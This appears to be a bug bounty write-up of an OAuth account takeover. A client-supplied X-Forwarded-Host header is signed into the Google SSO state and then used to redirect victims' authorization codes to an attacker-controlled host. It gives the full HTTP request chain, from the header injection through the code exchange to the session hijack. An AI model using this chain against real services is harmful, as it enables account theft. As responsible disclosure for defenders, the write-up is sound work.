# The Header That Signed Itself: Full Account Takeover in a Google SSO Flow

- **Category:** OAuth & SSO Vulnerabilities
- **Publication Date:** 2026-07-26
- **Source Channel:** Daily Bounty Writeups
- **Original Source URL:** [https://uchihamrx.medium.com/the-header-that-signed-itself-full-account-takeover-in-a-google-sso-flow-940ed68b77e2?source=rss------bug_bounty-5](https://uchihamrx.medium.com/the-header-that-signed-itself-full-account-takeover-in-a-google-sso-flow-940ed68b77e2?source=rss------bug_bounty-5)

---

## Detailed Writeup & Technical Breakdown

## The Header That Signed Itself: Full Account Takeover in a Google SSO Flow


--


1


Listen


Share




In the name of God, the most gracious, the most merciful.May Allah’s blessings and peace be upon our Prophet Muhammad.


## Introduction


In this post, I’ll walk through how a single client-controlled header was transformed into a server-signed OAuth state, allowing an unauthenticated attacker to steal Google OAuth authorization codes and achieve full account takeover. Along the way, we’ll see why cryptography wasn’t the problem — the trust model was.


I want to start with the part that still makes me smile, because it’s the whole bug in one sentence:


The server didn’t trust the attacker. It just signed whatever the attacker said and then trusted its own signature.


That’s it. That’s the vulnerability. Everything below is me slowly figuring out that sentence.


## How I got here


I wasn’t hunting for an ATO. I was doing the boring thing — walking through one of my fav BB program targets’ login flow with Burp open, clicking “Sign in with Google,” and reading responses I had already read three times.


This is most of bug bounty, honestly. You’re not looking for a bug. You’re looking for something slightly odd, and then you sit with the odd thing until it either explains itself or turns into money.


The odd thing showed up in the state parameter.


Every OAuth flow has one. Normally it’s a random blob — a nonce, a session ID, something opaque. You glance at it and move on. But this one looked like this:


```
<nonce>.<https://org.target.com>:<timestamp>:<hmac>
```


I stopped scrolling.


There’s a hostname in there. Not a random token — an actual origin, sitting in plaintext, in the middle of a signed value. And next to it, an HMAC, which means somebody on the vendor side thought hard enough about this to sign it.


Two thoughts hit at the same time:

- Signed values are usually a dead end. Move on.
- But why is a URL in there at all?

The second thought is the one worth having. A signature protects a value from being changed. It says nothing about whether the value was correct in the first place.


Hold that. It’s the whole report.


## Wall 1 — Cloudflare (rejected, loudly)


So I did the oldest thing in the book and just overrode the host outright:


Changed Host:org.target.com to my own domain using HHI


```
GET /googlelogin HTTP/2Host: attacker.com
```


And I never even reached the application:


```
HTTP/2 403 ForbiddenServer: cloudflare
```


Blocked at the edge. Cloudflare sits in front of this target, and a Host that doesn’t match a hostname it knows about doesn’t get routed anywhere — it gets a block page. The app never saw the request, never made a decision, never told me anything.


This is a genuinely useful failure, though, and it’s worth reading carefully rather than sighing at. It doesn’t say “the app validates the host.” It says “the request never got to the app.” Those are completely different facts, and only the second one is actually proven.


## Wall 2 — Google (rejected, by design)


Before going further down the header path, I checked the obvious alternative: forget the app entirely, just make Google send the code somewhere else.


That’s dead on arrival, and it should be. The redirect_uri in the outbound authorization request is pinned to whatever the vendor registered in their Google OAuth client config:


```
&redirect_uri=https://login.target.com/oauthcallback
```


Google enforces that by exact match against the registered URI list. You can’t move it, you can’t append a path, you can’t sneak a subdomain in, you can’t smuggle it via a parameter. Any mismatch and Google refuses the whole request with redirect_uri_mismatch before the victim ever sees a consent screen. That value is effectively sanitized and locked from my side.


So the two loudest paths were both shut:

- I can’t rewrite the signed state (HMAC).
- I can’t override the host directly (Cloudflare).
- I can’t redirect Google’s code anywhere (registered URI allowlist).

Three walls. This is normally where the tab closes.


Apps behind proxies rarely read Host directly anyway. They read whatever the load balancer forwarded them. And the classic one is X-Forwarded-Host.


## Through the seam — X-Forwarded-Host


So this time I left Host completely legitimate, so Cloudflare would happily route it, and put my domain in the forwarded header instead:


```
GET /googlelogin HTTP/2Host: org.target.comX-Forwarded-Host: attacker.com?
```


Nothing clever. A valid host for the edge, a hostile host for the app.


And the response came back:


```
HTTP/2 302 FoundLocation: <https://accounts.google.com/o/oauth2/v2/auth?.>..  &state=<NONCE>.<https://attacker.com?:><TIMESTAMP>:<VALID_HMAC>  &redirect_uri=https://login.target.com/oauthcallbackSet-Cookie: oauth2XsrfState=<NONCE>.<https://attacker.com?:><TIMESTAMP>:<VALID_HMAC>
```


```
Set-Cookie: oauth2XsrfState=<NONCE>.<https://attacker.com?:><TIMESTAMP>:<VALID_HMAC>
```


I read that state value about four times.


My domain. In the state. With a valid HMAC on it. Signed by the target. For free. As an unauthenticated user with no account in that org and no relationship to it whatsoever.The server had just become my signing service.


Here’s the transformation that matters, drawn out:


(Small note on the ? I appended to my host — that’s not decoration. It matters later, when the host gets concatenated into a URL. Trailing punctuation is how you control what happens to everything glued on after you. Worth keeping in your pocket.)


### The moment I thought it was dead.


Now look at the rest of that response, because this is where I nearly threw the whole thing away:


```
redirect_uri=https://login.target.com/oauthcallback
```


Google’s redirect_uri is still the target’s. Untouched.


Still the target’s. Untouched. My header injection changed the state, and did nothing at all to where Google sends the code.So I sat there with a signed state containing my domain and a hard wall in front of it. Google will hand the victim’s authorization code to login.target.com. Not to me. Because a signed value that the server can’t change is only useless if the server ignores it. And they clearly didn’t put a hostname in there for fun. That hostname is for something.


## /oauthcallback — the second redirect


So I ran the flow properly. Real Google account, real consent screen, real login. Google does its job and sends the browser to:


```
<https://login.target.com/oauthcallback?code=><CODE>&state=<SIGNED_STATE>
```


And the app answers:


```
HTTP/2 302 FoundLocation: <https://attacker.com/oauthcblogin?code=><CODE>&state=<SIGNED_STATE>
```


There it is.


Google guarded its own doorstep perfectly — and then the app picked up the package and forwarded it to the address written on the note it had signed itself.


That hostname in the state wasn’t decoration. It was a routing instruction. The product is multi-tenant; login.target.com is the shared front door for Google SSO, and after Google authenticates you, it has to bounce you back to your org’s subdomain to actually establish the session. The state carries “which org do I send this person back to.”


Which means the org origin isn’t just data. It’s a redirect target. And I got to pick it, and the server signed my pick, and then the server obeyed its own signature.


The signature was working perfectly. That was the problem. It was faithfully enforcing a decision that never should have been trusted.


I ran the flow again with a listener on my domain, and the victim’s authorization code landed in my logs. Without needing my cookie. The redirect happened purely on the strength of the signed state.


### Turning a code into a session


A stolen authorization code is only a real finding if I can spend it. Plenty of flows would stop me here — PKCE, or binding the code to the session that started the flow. So I went to check what was actually enforced.


The third endpoint, /oauthcblogin, is where the code gets exchanged. I had everything I needed from Step 1: the signed state, and the oauth2XsrfState cookie that was issued to me when I minted it.


```
GET /oauthcblogin?code=<VICTIM_CODE>&state=<SIGNED_STATE> HTTP/2Host: org.target.comCookie: oauth2XsrfState=<SIGNED_STATE>
```


The CSRF cookie check passes trivially — I’m the one who created both halves. Attacker state, attacker cookie, victim’s code.


Response:


```
<meta name="authorizationToken" content="<JWT>">
```


Decoded:


```
{  "email": "victim@gmail.com",  "id": 9434xx,  "iat": 1783461594,  "exp": 1783461894}
```


No PKCE. No re-validation of the org origin at exchange time. No binding between the authorization code and whoever actually initiated the flow. Three separate places where this could have stopped, and it went through all of them.


The last two steps were almost anticlimactic. Trade the token for real cookies:


```
POST /api/auth/saveAuth HTTP/2Host: org.target.comContent-Type: application/json{"authorizationToken": "<JWT>"}
```


```
HTTP/2 200 OKSet-Cookie: accessToken=<session JWT>Set-Cookie: xsrfToken=<value>
```


And confirm who I am:


```
GET /api/user HTTP/2Host: org.target.comCookie: accessToken=<session JWT>; xsrfToken=<value>X-Xsrf-Token: <value>
```


Victim’s profile. Full session. Done.


Unauthenticated attacker → complete account takeover. No password. No phishing page. No compromise of Google. The victim types their credentials into the real accounts.google.com, sees nothing unusual, and loses their account.


And login.target.com is the shared SSO front door — every cloud tenant using Google SSO sits behind the same flow. Admin gets phished this way, and you’re not losing an account; you’re losing apps, workflows, databases, secrets, and every integration the org has wired up.


## The whole attack in one picture


First, what’s supposed to happen:


Now the same flow with one header changed:


The one-line version, if you only remember one thing:


```
X-Forwarded-Host  ──►  signed into state  ──►  used as a redirect target     (attacker)              (server)                  (server obeys)
```


### Root Cause


The vulnerability is caused by multiple issues in the Google OAuth implementation:

- /googlelogin derives orgOrigin from the client-controlled X-Forwarded-Host header and signs it with the server HMAC.
- /oauthcallback trusts the signed state and redirects the Google authorization code to the host embedded inside it.
- /oauthcblogin exchanges the authorization code without enforcing PKCE, validating the original organization origin, or binding the authorization code to the original OAuth session.

Together, these flaws allow an unauthenticated attacker to obtain a victim’s OAuth authorization code and convert it into a fully ATO.


I’ve submitted the report to the program. They acknowledged its severity as critical P1.


Thank you for taking the time to read, and I hope it proves beneficial to you.


Feel free to connect with me on Twitter or LinkedIn.

---
*Archived in Auth Bypass Vault from verified bug bounty community intelligence.*
